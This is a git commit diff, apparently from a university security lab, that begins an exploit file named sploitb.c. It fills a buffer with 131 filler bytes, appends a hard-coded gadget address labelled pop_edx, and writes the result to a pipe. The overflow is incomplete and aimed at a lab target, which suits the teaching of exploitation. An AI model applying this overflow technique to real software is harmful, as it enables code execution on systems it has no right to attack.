2478deb5e5f6a6a5201ee508eb29102d8f73a7c7
ishanphadke <44324805+ishanphadke@users.noreply.github.com>
2020-10-25 15:05:04 -0500

    starting sploitb

--- lab4/sploitb.c
+++ lab4/sploitb.c
@@ -7,7 +7,20 @@
 
 int main(void)
 {
-  writecmd(PIPEPATH, "Hello from sploitb!");
+  char bufr[200];
+
+  char pop_edx[] = "\x1b\xdc\xb9\xbb";
+
+  char exec_arg[] = "\x8a\x01\x01\x01";
+
+  int i;
+  // Fill up buffer
+  for(i = 0; i < 131; i++)
+    memcpy(bufr + i, "\x01",1);
+
+  strcpy(bufr + 131, pop_edx); // 0xbbb9dc1b
+
+  writecmd(PIPEPATH, bufr);
   
   return 0;
 }
